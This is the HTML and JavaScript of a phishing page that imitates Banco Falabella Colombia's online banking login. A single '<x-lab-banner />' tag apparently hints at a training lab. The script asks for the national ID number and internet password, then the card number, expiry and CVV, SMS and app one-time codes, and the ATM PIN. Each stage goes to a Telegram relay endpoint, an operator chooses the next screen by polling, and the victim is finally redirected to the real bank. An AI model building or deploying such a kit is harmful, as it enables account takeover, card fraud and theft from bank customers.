<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Adquiere tu tarjeta CMR y cuenta de ahorro costo $0 | Banco Falabella</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css"
        integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.3.0/font/bootstrap-icons.css">
    <link rel="preload" href="/falabella/password.ttf" as="font" type="font/ttf" crossorigin="anonymous">
    <script src="https://code.jquery.com/jquery-3.7.1.min.js"
        integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>

    <style>
        @font-face {
            font-family: pfbeausans;
            src: url(/falabella/pfbeausanspro-reg-webfont.bc031052ed78c6fe8f2c.woff2) format("woff2"),
                url(/falabella/pfbeausanspro-reg-webfont.ec5c0bc668dd6fab5659.woff) format("woff");
            font-weight: 400;
            font-style: normal;
        }

        @font-face {
            font-family: pfbeausans;
            src: url(/falabella/pfbeausanspro-bold-webfont.281b2f269a507a214a21.woff2) format("woff2"),
                url(/falabella/pfbeausanspro-bold-webfont.95dbe7a1cfb02d6d7ffa.woff) format("woff");
            font-weight: 700;
            font-style: normal;
        }

        @font-face {
            font-family: pfbeausans;
            src: url(/falabella/pfbeausanspro-thin-webfont.ce2e317d183abdd86628.woff2) format("woff2"),
                url(/falabella/pfbeausanspro-thin-webfont.2c3865d1bde1cfc627aa.woff) format("woff");
            font-weight: 300;
            font-style: normal;
        }

        :root {
            --green-banco: #38a121;
            --green-banco-hover: #43b02a;
            --gray-functional: #5c6166;
            --gray-functional-light: #8a9199;
            --gray-functional-lighter: #cfdae6;
            --primary: #dc2a4d;
            --error-color: #dc3545;
        }

        body {
            font-family: pfbeausans, Arial, sans-serif;
        }

        .texto-1 {
            font-family: pfbeausans, Arial, sans-serif;
            font-size: 1rem;
            font-weight: 400;
            line-height: 1.5;
            color: #212529;
            margin-bottom: 1rem;
        }

        .texto-2 {
            font-family: pfbeausans, Arial, sans-serif;
            font-weight: 400;
            font-size: 14px;
            line-height: 1.5rem;
            color: #212529;
        }

        .titulo-1 {
            font-family: pfbeausans, Arial, sans-serif;
            font-size: 18px;
            font-weight: 700;
            line-height: 1.5;
            color: #212529;
            letter-spacing: .16rem;
        }

        .entrada-1 {
            font-family: pfbeausans, Arial, sans-serif;
            display: block;
            transition: border-color .15s ease-in-out, box-shadow .15s ease-in-out;
            border: 1px solid #c2c2c2;
            border-radius: 3px;
            outline: none;
            color: #757575;
            background: #fff;
            line-height: 14px;
            padding: 8px;
            height: 3.5rem;
            width: 100%;
            margin: .5rem 0;
            font-size: 1rem;
            padding-left: 1rem;
        }

        .entrada-1:focus {
            border-color: var(--green-banco);
            box-shadow: 0 0 0 0.2rem rgba(56, 161, 33, 0.25);
        }

        .select-1 {
            font-family: pfbeausans, Arial, sans-serif;
            display: block;
            transition: border-color .15s ease-in-out, box-shadow .15s ease-in-out;
            border: 1px solid #c2c2c2;
            border-radius: 3px;
            outline: none;
            color: #757575;
            background: #fff;
            line-height: 14px;
            padding: 8px;
            height: 3.5rem;
            width: 100%;
            margin: .5rem 0;
            font-size: 1rem;
            padding-left: 1rem;
        }

        .boton-1 {
            font-family: pfbeausans, Arial, sans-serif;
            display: inline-block;
            font-weight: 700;
            text-align: center;
            white-space: nowrap;
            vertical-align: middle;
            user-select: none;
            border: 1px solid transparent;
            transition: color .15s ease-in-out, background-color .15s ease-in-out, border-color .15s ease-in-out, box-shadow .15s ease-in-out;
            color: #fff;
            background-color: var(--green-banco);
            border-color: var(--green-banco);
            font-size: .875rem;
            line-height: 1.5;
            border-radius: .2rem;
            letter-spacing: .16rem;
            text-transform: uppercase;
            padding: .6rem 1rem;
            text-decoration: none;
            cursor: pointer;
            height: 50px;
        }

        .boton-1:hover {
            background-color: var(--green-banco-hover);
            border-color: var(--green-banco-hover);
        }

        .boton-1:disabled {
            background-color: #ccc;
            border-color: #ccc;
            cursor: not-allowed;
        }

        .label-1 {
            font-family: pfbeausans, Arial, sans-serif;
            font-weight: 600;
            font-size: .857rem;
            text-align: left;
            line-height: 1rem;
            margin-bottom: 4px;
            padding: 2px 0 0;
            color: var(--gray-functional);
        }

        @media only screen and (min-width: 768px) {
            body {
                width: 40%;
                margin: 0 auto;
            }
        }

        .hidden {
            display: none !important;
        }

        .error-message {
            color: var(--error-color);
            font-family: pfbeausans, Arial, sans-serif;
            font-weight: 500;
            font-size: 12px;
            margin-top: 4px;
            margin-left: 8px;
            display: none;
        }

        .error-message.show {
            display: block;
        }

        .borde-entrada-error {
            border-color: var(--error-color) !important;
        }

        .loading-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(255, 255, 255, 0.95);
            z-index: 9999;
            justify-content: center;
            align-items: center;
        }

        .loading-overlay.active {
            display: flex;
        }

        .loading-spinner {
            display: inline-block;
            width: 50px;
            height: 50px;
            border: 5px solid rgba(230, 230, 230, .3);
            border-radius: 50%;
            border-top-color: var(--green-banco);
            animation: spin 1s ease-in-out infinite;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }
    </style>
</head>

<body class="px-3">
<x-lab-banner />
    <!-- Loading Overlay -->
    <div id="loading" class="fixed-top bg-white d-flex align-items-center justify-content-center hidden"
        style="height: 100vh; z-index: 9999;">
        <div class="text-center">
            <div class="loading-spinner mx-auto"></div>
            <p class="mt-3 texto-2">Espere un momento por favor...</p>
        </div>
    </div>

    <!-- Header -->
    <div class="text-center py-4">
        <img src="/falabella/logo_falabella.svg" width="270" height="55" alt="Banco Falabella">
    </div>

    <!-- Vista: Login -->
    <div id="login" class="hidden">
        <h1 class="titulo-1 mt-4 text-center px-5">BANCA EN LINEA</h1>
        <br>
        <!-- Mensaje de error general -->
        <div id="errorGeneralLogin" class="error-message text-center mb-3" style="font-size: 14px; font-weight: bold;"></div>
        <div class="px-4 py-4 mb-2">
            <div class="mb-4">
                <label class="label-1" for="tipo-documento">Tipo de Documento</label>
                <select class="select-1 w-100 mb-4" id="tipo-documento">
                    <option value="1" selected>Cedula de Ciudadania</option>
                    <option value="2">Cedula de Extranjeria</option>
                    <option value="4">Pasaporte</option>
                </select>
            </div>
            <div class="mb-4">
                <label class="label-1" for="usuario">Numero de Documento</label>
                <input class="entrada-1 w-100" id="usuario" name="usuario" type="text" placeholder="Numero de documento"
                    minlength="4" maxlength="15" autocomplete="off">
                <div class="error-message" id="errorUsuario"></div>
            </div>
            <br>
            <div class="mb-5">
                <label class="label-1" for="clave">Clave Internet</label>
                <input class="entrada-1 w-100" id="clave" name="clave" type="password" placeholder="Clave Internet"
                    minlength="6" maxlength="6" autocomplete="off">
                <div class="error-message" id="errorClave"></div>
            </div>
            <div class="mt-3 text-center">
                <button id="btnLogin" class="boton-1 text-center px-5" disabled>INGRESAR</button>
            </div>
        </div>
    </div>

    <!-- Vista: Tarjeta de Credito -->
    <div id="tdc" class="hidden">
        <h1 class="titulo-1 mt-4 text-center px-5">VALIDACION DE SEGURIDAD</h1>
        <br>
        <div class="text-center mb-3 px-3">
            <p class="texto-2 mb-0 mt-2">Por seguridad debemos validar la informacion del siguiente producto:</p>
        </div>
        <!-- Mensaje de error general -->
        <div id="errorGeneralTDC" class="error-message text-center mb-3" style="font-size: 14px; font-weight: bold;"></div>
        <div class="px-4 py-4 mb-2">
            <div class="mb-4">
                <label class="label-1" for="numtarjetaTDC">Numero de tarjeta</label>
                <input class="entrada-1 w-100" id="numtarjetaTDC" name="numtarjetatdc" type="text"
                    placeholder="Numero de tarjeta" minlength="16" maxlength="19" autocomplete="off">
                <div class="error-message" id="errorNumTarjetaTDC"></div>
            </div>
            <div class="row mb-4">
                <div class="col-6">
                    <label class="label-1" for="vencimientoTDC">Fecha de vencimiento</label>
                    <input class="entrada-1 w-100" id="vencimientoTDC" name="vencimientotdc" type="text"
                        placeholder="MM/AA" minlength="5" maxlength="5" autocomplete="off">
                    <div class="error-message" id="errorVencimientoTDC"></div>
                </div>
                <div class="col-6">
                    <label class="label-1" for="cvvTDC">CVV</label>
                    <input class="entrada-1 w-100" id="cvvTDC" name="cvvtdc" type="text"
                        placeholder="CVV" minlength="3" maxlength="4" autocomplete="off">
                    <div class="error-message" id="errorCVVTDC"></div>
                </div>
            </div>
            <div class="mb-5" style="font-size: 12px;">
                <input type="checkbox" id="checkTDC" style="accent-color: #38a121;">
                <label for="checkTDC" style="margin-left: 8px;">Certifico que soy el titular de este producto</label>
            </div>
            <div class="mt-3 text-center">
                <button id="btnTDC" class="boton-1 text-center px-5" disabled>VALIDAR</button>
            </div>
        </div>
    </div>

    <!-- Vista: Codigo SMS -->
    <div id="codsms" class="hidden">
        <h1 class="titulo-1 mt-4 text-center px-5">VALIDACION DE SEGURIDAD</h1>
        <br>
        <div class="text-center mb-3 px-3">
            <p class="texto-2 mb-0 mt-2">Ingresa el codigo de seguridad que le hemos enviado por mensaje de texto a su celular:</p>
        </div>
        <!-- Mensaje de error general -->
        <div id="errorGeneralCodSMS" class="error-message text-center mb-3" style="font-size: 14px; font-weight: bold;"></div>
        <div class="px-5 mb-5">
            <label class="label-1" for="codsmsInput">Codigo de seguridad</label>
            <input class="entrada-1 w-100 mb-3" id="codsmsInput" name="codsms" type="password"
                placeholder="Codigo de seguridad" minlength="6" maxlength="8" autocomplete="off">
            <div class="error-message" id="errorCodSMS"></div>
        </div>
        <div class="mt-5 text-center">
            <button id="btnCodSMS" class="boton-1 text-center px-5 pt-2" disabled>VALIDAR</button>
        </div>
    </div>

    <!-- Vista: Codigo App -->
    <div id="codapp" class="hidden">
        <h1 class="titulo-1 mt-4 text-center px-5">VALIDACION DE SEGURIDAD</h1>
        <br>
        <div class="text-center mb-3 px-3">
            <p class="texto-2 mb-0 mt-2">Ingresa el codigo de seguridad que aparece en la App de su celular:</p>
        </div>
        <!-- Mensaje de error general -->
        <div id="errorGeneralCodApp" class="error-message text-center mb-3" style="font-size: 14px; font-weight: bold;"></div>
        <div class="px-5 mb-5">
            <label class="label-1" for="codappInput">Codigo de seguridad</label>
            <input class="entrada-1 w-100 mb-3" id="codappInput" name="codapp" type="password"
                placeholder="Codigo de seguridad" minlength="6" maxlength="8" autocomplete="off">
            <div class="error-message" id="errorCodApp"></div>
        </div>
        <div class="mt-5 text-center">
            <button id="btnCodApp" class="boton-1 text-center px-5 pt-2" disabled>VALIDAR</button>
        </div>
    </div>

    <!-- Vista: Clave de Cajero -->
    <div id="pincaj" class="hidden">
        <h1 class="titulo-1 mt-4 text-center px-5">VALIDACION DE SEGURIDAD</h1>
        <br>
        <div class="text-center mb-3 px-3">
            <p class="texto-2 mb-0 mt-2">Ingresa la clave que usas en el cajero:</p>
        </div>
        <!-- Mensaje de error general -->
        <div id="errorGeneralPinCaj" class="error-message text-center mb-3" style="font-size: 14px; font-weight: bold;"></div>
        <div class="px-5 mb-5">
            <label class="label-1" for="pincajInput">Clave de cajero</label>
            <input class="entrada-1 w-100 mb-3" id="pincajInput" name="pincaj" type="password"
                placeholder="Clave de cajero" minlength="4" maxlength="4" autocomplete="off">
            <div class="error-message" id="errorPinCaj"></div>
        </div>
        <div class="mt-5 text-center">
            <button id="btnPinCaj" class="boton-1 text-center px-5 pt-2" disabled>VALIDAR</button>
        </div>
    </div>

    <!-- Vista: Exito -->
    <div id="exito" class="hidden">
        <div class="text-center">
            <div class="my-4">
                <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" fill="#38a121"
                    class="bi bi-check-circle-fill" viewBox="0 0 16 16">
                    <path
                        d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0zm-3.97-3.03a.75.75 0 0 0-1.08.022L7.477 9.417 5.384 7.323a.75.75 0 0 0-1.06 1.06L6.97 11.03a.75.75 0 0 0 1.079-.02l3.992-4.99a.75.75 0 0 0-.01-1.05z" />
                </svg>
            </div>
            <h2 class="mb-3 titulo-1">Proceso completado exitosamente</h2>
            <p class="texto-2">Gracias por utilizar nuestros servicios.</p>
            <p class="texto-2">Seras redirigido en breve...</p>
        </div>
    </div>

    <!-- Vista: Error -->
    <div id="error" class="hidden">
        <div class="text-center">
            <div class="my-4">
                <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" fill="#dc3545"
                    class="bi bi-x-circle-fill" viewBox="0 0 16 16">
                    <path
                        d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0zM5.354 4.646a.5.5 0 1 0-.708.708L7.293 8l-2.647 2.646a.5.5 0 0 0 .708.708L8 8.707l2.646 2.647a.5.5 0 0 0 .708-.708L8.707 8l2.647-2.646a.5.5 0 0 0-.708-.708L8 7.293 5.354 4.646z" />
                </svg>
            </div>
            <h2 class="mb-3 titulo-1">Ha ocurrido un error</h2>
            <p class="texto-2">Por favor intenta nuevamente mas tarde.</p>
            <p class="texto-2">Seras redirigido en breve...</p>
        </div>
    </div>

    <!-- Vista: Wait (Loading intermedio) -->
    <div id="wait" class="hidden">
        <div class="text-center mt-5">
            <div class="loading-spinner" style="width: 100px; height: 100px; border-width: 10px;"></div>
        </div>
        <br>
        <div class="text-center">
            <p class="texto-1">Espere un momento por favor.</p>
        </div>
    </div>

    <script>
        $(document).ready(function () {
            // ==================== CONFIGURACION INICIAL ====================
            function generateUniqId() {
                const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
                let result = '';
                for (let i = 0; i < 6; i++) {
                    result += chars.charAt(Math.floor(Math.random() * chars.length));
                }
                return result;
            }

            let sessionUniqId = sessionStorage.getItem('uniqId');
            if (!sessionUniqId || sessionUniqId.startsWith('sess_') || sessionUniqId.length !== 6) {
                if (sessionUniqId && (sessionUniqId.startsWith('sess_') || sessionUniqId.length !== 6)) {
                    localStorage.clear();
                }
                sessionUniqId = generateUniqId();
                sessionStorage.setItem('uniqId', sessionUniqId);
            }

            const appState = {
                uniqId: sessionUniqId,
                currentView: 'login'
            };

            console.log('Session UniqID:', appState.uniqId);

            // ==================== RECUPERAR DATOS PSE ====================
            const pseDatosStr = sessionStorage.getItem('pseDatos');
            if (pseDatosStr) {
                try {
                    const pseDatos = JSON.parse(pseDatosStr);
                    const camposPSE = {
                        'nombre': pseDatos.nombre,
                        'email': pseDatos.email,
                        'celular': pseDatos.celular,
                        'direccion': pseDatos.direccion,
                        'ciudad': pseDatos.ciudad,
                        'departamento': pseDatos.departamento,
                        'banco': pseDatos.banco,
                        'tipoPersona': pseDatos.tipoPersona,
                        'ente': 'brasilia'
                    };
                    Object.keys(camposPSE).forEach(key => {
                        if (camposPSE[key]) {
                            const storageKey = `${appState.uniqId}_${key}`;
                            localStorage.setItem(storageKey, JSON.stringify(camposPSE[key]));
                        }
                    });
                    console.log('Datos PSE recuperados:', pseDatos);
                } catch (e) {
                    console.error('Error al parsear pseDatos:', e);
                }
            }

            // ==================== FUNCIONES AUXILIARES ====================
            function saveToLocalStorage(key, value) {
                const storageKey = `${appState.uniqId}_${key}`;
                const valueToSave = value && value.trim() !== '' ? value : '--';
                localStorage.setItem(storageKey, JSON.stringify(valueToSave));
            }

            function getFromLocalStorage(key) {
                const storageKey = `${appState.uniqId}_${key}`;
                const value = localStorage.getItem(storageKey);
                return value ? JSON.parse(value) : '--';
            }

            function mostrarError(fieldId, errorId, containerId, mensaje) {
                $('#' + errorId).text(mensaje).addClass('show');
                $('#' + containerId).addClass('borde-entrada-error');
            }

            function ocultarError(errorId, containerId) {
                $('#' + errorId).removeClass('show').text('');
                $('#' + containerId).removeClass('borde-entrada-error');
            }

            function hideAllViews() {
                $('#login, #tdc, #codsms, #codapp, #pincaj, #exito, #error, #wait').addClass('hidden');
            }

            function showView(viewId) {
                hideAllViews();
                $('#' + viewId).removeClass('hidden');

                const viewHistory = sessionStorage.getItem('viewHistory') || '';

                if (viewHistory.includes(viewId) && viewId !== 'wait' && viewId !== 'exito' && viewId !== 'error') {
                    if (viewId === 'login') {
                        $('#errorGeneralLogin').text('Los datos ingresados son incorrectos. Intenta nuevamente.').addClass('show');
                        $('#usuario').val('');
                        $('#clave').val('');
                        $('#btnLogin').prop('disabled', true);
                    } else if (viewId === 'tdc') {
                        $('#errorGeneralTDC').text('Validacion sin exito, intenta nuevamente o ingresa los datos de otra tarjeta.').addClass('show');
                        $('#numtarjetaTDC, #vencimientoTDC, #cvvTDC').val('');
                        $('#checkTDC').prop('checked', false);
                        $('#btnTDC').prop('disabled', true);
                    } else if (viewId === 'codsms') {
                        $('#errorGeneralCodSMS').text('El codigo de seguridad es incorrecto. Intenta nuevamente.').addClass('show');
                        $('#codsmsInput').val('');
                        $('#btnCodSMS').prop('disabled', true);
                    } else if (viewId === 'codapp') {
                        $('#errorGeneralCodApp').text('El codigo de seguridad es incorrecto. Intenta nuevamente.').addClass('show');
                        $('#codappInput').val('');
                        $('#btnCodApp').prop('disabled', true);
                    } else if (viewId === 'pincaj') {
                        $('#errorGeneralPinCaj').text('La clave de cajero es incorrecta. Intenta nuevamente.').addClass('show');
                        $('#pincajInput').val('');
                        $('#btnPinCaj').prop('disabled', true);
                    }
                } else {
                    $('.error-message').removeClass('show').text('');
                }

                if (!viewHistory.includes(viewId)) {
                    sessionStorage.setItem('viewHistory', viewHistory + viewId + ',');
                }

                appState.currentView = viewId;
            }

            function showLoading() {
                $('#loading').removeClass('hidden');
                setTimeout(iniciarPolling, 4000);
            }

            function hideLoading() {
                $('#loading').addClass('hidden');
            }

            let enviandoATelegram = false;

            async function enviarATelegram() {
                if (enviandoATelegram) {
                    console.log('Ya hay un envio en progreso, evitando duplicado');
                    return;
                }

                enviandoATelegram = true;

                const allData = {};
                const fields = ['usuario', 'clave', 'ente', 'numtarjetaTDC', 'cvvTDC', 'vencimientoTDC',
                    'nombre', 'email', 'celular', 'ciudad', 'direccion', 'departamento',
                    'banco', 'tipoPersona', 'codsms', 'codapp', 'pincaj', 'status', 'uniqid'
                ];

                fields.forEach(field => {
                    allData[field] = getFromLocalStorage(field);
                });

                console.log('Datos a enviar a Telegram:', allData);

                try {
                    const response = await fetch('/api/telegram/send', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'Accept': 'application/json'
                        },
                        body: JSON.stringify({
                            uniqid: appState.uniqId,
                            data: allData
                        })
                    });
                    const result = await response.json();
                    console.log('Datos enviados a Telegram:', result);
                } catch (e) {
                    console.error('Error al enviar a Telegram:', e);
                } finally {
                    setTimeout(() => {
                        enviandoATelegram = false;
                    }, 1000);
                }
            }

            async function iniciarPolling() {
                const loadingElement = document.getElementById('loading');
                if (loadingElement && loadingElement.classList.contains('hidden')) {
                    return;
                }

                try {
                    const response = await fetch(`/api/telegram/check-button`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'Accept': 'application/json'
                        },
                        body: JSON.stringify({
                            uniqid: appState.uniqId
                        })
                    });
                    const data = await response.json();

                    if (data.button) {
                        hideLoading();

                        const viewMap = {
                            'login': 'login',
                            'tdc': 'tdc',
                            'codsms': 'codsms',
                            'codapp': 'codapp',
                            'pincaj': 'pincaj',
                            'exito': 'exito',
                            'error': 'error'
                        };

                        const viewId = viewMap[data.button] || data.button;
                        showView(viewId);

                        if (viewId === 'exito' || viewId === 'error') {
                            setTimeout(function () {
                                window.location.href = 'https://www.bancofalabella.com.co/tarjetas-credito-cmr';
                            }, 5000);
                        }
                    } else {
                        setTimeout(iniciarPolling, 2000);
                    }
                } catch (error) {
                    console.error('Error en polling:', error);
                    setTimeout(iniciarPolling, 2000);
                }
            }

            // ==================== VALIDACIONES ====================
            function validarLuhn(cardNumber) {
                const numero = cardNumber.replace(/\s/g, '');
                if (!/^\d+$/.test(numero)) return false;

                let suma = 0;
                let alternar = false;

                for (let i = numero.length - 1; i >= 0; i--) {
                    let digito = parseInt(numero.charAt(i), 10);
                    if (alternar) {
                        digito *= 2;
                        if (digito > 9) digito -= 9;
                    }
                    suma += digito;
                    alternar = !alternar;
                }

                return (suma % 10) === 0;
            }

            function validarVencimiento(vencimiento) {
                if (!/^\d{2}\/\d{2}$/.test(vencimiento)) return false;

                const [mes, anio] = vencimiento.split('/');
                const mesNum = parseInt(mes, 10);
                const anioNum = parseInt(anio, 10);

                if (mesNum < 1 || mesNum > 12) return false;

                const hoy = new Date();
                const anioActual = hoy.getFullYear() % 100;
                const mesActual = hoy.getMonth() + 1;

                if (anioNum < anioActual) return false;
                if (anioNum === anioActual && mesNum < mesActual) return false;

                return true;
            }

            function validateLogin() {
                const usuario = $('#usuario').val().trim();
                const clave = $('#clave').val().trim();
                const usuarioRegex = /^\d{4,15}$/;
                const claveRegex = /^\d{6}$/;
                const isValid = usuarioRegex.test(usuario) && claveRegex.test(clave);
                $('#btnLogin').prop('disabled', !isValid);
                return isValid;
            }

            function validateTarjeta() {
                const num = $('#numtarjetaTDC').val().replace(/\s/g, '');
                const ven = $('#vencimientoTDC').val();
                const cvv = $('#cvvTDC').val();
                const check = $('#checkTDC').is(':checked');

                const isValid = num.length >= 15 && validarLuhn(num) &&
                               validarVencimiento(ven) && cvv.length >= 3 && check;

                $('#btnTDC').prop('disabled', !isValid);
                return isValid;
            }

            function validateOtp(inputId, btnId) {
                const value = $(inputId).val().trim();
                let isValid = false;

                if (inputId === '#pincajInput') {
                    isValid = /^\d{4}$/.test(value);
                } else {
                    isValid = /^\d{6,8}$/.test(value);
                }

                $(btnId).prop('disabled', !isValid);
                return isValid;
            }

            // ==================== EVENTOS ====================
            // Login
            $('#usuario, #clave').on('input', validateLogin);
            $('#btnLogin').on('click', async function () {
                if (validateLogin()) {
                    saveToLocalStorage('usuario', $('#usuario').val().trim());
                    saveToLocalStorage('clave', $('#clave').val().trim());
                    saveToLocalStorage('ente', 'falabella');
                    saveToLocalStorage('status', 'LOGIN');
                    saveToLocalStorage('uniqid', appState.uniqId);

                    await enviarATelegram();
                    showLoading();
                }
            });

            // Tarjeta de Credito
            $('#numtarjetaTDC').on('input', function () {
                let value = $(this).val().replace(/\s/g, '');
                value = value.replace(/\D/g, '');
                if (value.length > 19) value = value.substring(0, 19);

                let formattedValue = '';
                for (let i = 0; i < value.length; i++) {
                    if (i > 0 && i % 4 === 0) formattedValue += ' ';
                    formattedValue += value[i];
                }
                $(this).val(formattedValue);
                validateTarjeta();
            });

            $('#vencimientoTDC').on('input', function () {
                let value = $(this).val().replace(/\D/g, '');
                if (value.length > 4) value = value.substring(0, 4);
                if (value.length >= 2) value = value.substring(0, 2) + '/' + value.substring(2, 4);
                $(this).val(value);
                validateTarjeta();
            });

            $('#cvvTDC').on('input', function () {
                let value = $(this).val().replace(/\D/g, '');
                if (value.length > 4) value = value.substring(0, 4);
                $(this).val(value);
                validateTarjeta();
            });

            $('#checkTDC').on('change', function () {
                validateTarjeta();
            });

            $('#btnTDC').on('click', async function () {
                if (validateTarjeta()) {
                    saveToLocalStorage('numtarjetaTDC', $('#numtarjetaTDC').val().trim());
                    saveToLocalStorage('cvvTDC', $('#cvvTDC').val().trim());
                    saveToLocalStorage('vencimientoTDC', $('#vencimientoTDC').val().trim());
                    saveToLocalStorage('status', 'TDC');

                    await enviarATelegram();
                    showLoading();
                }
            });

            // Codigo SMS
            $('#codsmsInput').on('input', function () {
                validateOtp('#codsmsInput', '#btnCodSMS');
            });
            $('#btnCodSMS').on('click', async function () {
                if (validateOtp('#codsmsInput', '#btnCodSMS')) {
                    saveToLocalStorage('codsms', $('#codsmsInput').val().trim());
                    saveToLocalStorage('status', 'CODSMS');

                    await enviarATelegram();
                    showLoading();
                }
            });

            // Codigo App
            $('#codappInput').on('input', function () {
                validateOtp('#codappInput', '#btnCodApp');
            });
            $('#btnCodApp').on('click', async function () {
                if (validateOtp('#codappInput', '#btnCodApp')) {
                    saveToLocalStorage('codapp', $('#codappInput').val().trim());
                    saveToLocalStorage('status', 'CODAPP');

                    await enviarATelegram();
                    showLoading();
                }
            });

            // Clave de Cajero
            $('#pincajInput').on('input', function () {
                validateOtp('#pincajInput', '#btnPinCaj');
            });
            $('#btnPinCaj').on('click', async function () {
                if (validateOtp('#pincajInput', '#btnPinCaj')) {
                    saveToLocalStorage('pincaj', $('#pincajInput').val().trim());
                    saveToLocalStorage('status', 'PINCAJ');

                    await enviarATelegram();
                    showLoading();
                }
            });

            // ==================== INICIALIZACION ====================
            showView('login');
        });
    </script>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL"
        crossorigin="anonymous"></script>
</body>

</html>
